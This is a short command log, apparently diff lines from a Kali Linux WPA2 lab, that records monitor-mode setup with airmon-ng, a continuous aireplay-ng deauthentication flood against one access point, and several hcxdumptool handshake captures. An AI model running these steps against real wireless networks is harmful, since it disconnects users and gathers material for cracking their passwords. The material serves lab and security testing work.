+2025-05-06 14:40:19,980 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_144019.pcapng
+2025-05-06 14:43:25,128 INFO CMD sudo airmon-ng check kill
+2025-05-06 14:43:25,374 INFO CMD sudo airmon-ng start wlan0
+2025-05-06 14:43:28,366 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 14:43:29,640 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-06 14:43:32,181 INFO CMD sudo airmon-ng check kill
+2025-05-06 14:43:32,398 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 14:43:46,428 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 14:43:46,585 INFO CMD sudo aireplay-ng --deauth 0 -a 3E:32:63:E9:67:E7 wlan1mon
+2025-05-06 14:45:42,766 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 14:45:42,783 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_144542.pcapng
+2025-05-06 14:46:23,186 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 14:46:23,386 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_144623.pcapng
